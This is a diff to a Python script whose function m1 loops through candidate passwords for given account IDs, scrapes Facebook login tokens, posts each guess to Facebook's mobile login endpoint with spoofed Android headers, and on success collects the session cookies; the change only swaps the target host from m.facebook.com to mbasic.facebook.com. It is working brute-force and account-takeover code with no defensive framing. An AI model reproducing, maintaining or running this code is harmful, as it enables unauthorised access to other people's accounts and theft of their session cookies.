@@ -831,7 +831,7 @@ def m1(ids,pwv):
     try:
         for pas in pwv:
             session = requests.Session()
-            free_fb = session.get(f"https://m.facebook.com").text
+            free_fb = session.get(f"https://mbasic.facebook.com").text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -842,7 +842,7 @@ def m1(ids,pwv):
             "email":ids,
             "pass":pas,
             "login":"Log In"}
-            update= {'Host': 'm.facebook.com',
+            update= {'Host': 'mbasic.facebook.com',
     'Content-Length': '1730',
     'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
     'Sec-CH-UA-Mobile': '?1',
@@ -860,14 +860,14 @@ def m1(ids,pwv):
     'Sec-CH-Prefers-Color-Scheme': 'light',
     'Sec-CH-UA-Platform': '"Android"',
     'Accept': '*/*',
-    'Origin': 'https://m.facebook.com',
+    'Origin': 'https://mbasic.facebook.com',
     'Sec-Fetch-Site': 'same-origin',
     'Sec-Fetch-Mode': 'cors',
     'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://m.facebook.com/',
+    'Referer': 'https://mbasic.facebook.com/',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-            response=session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
+            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
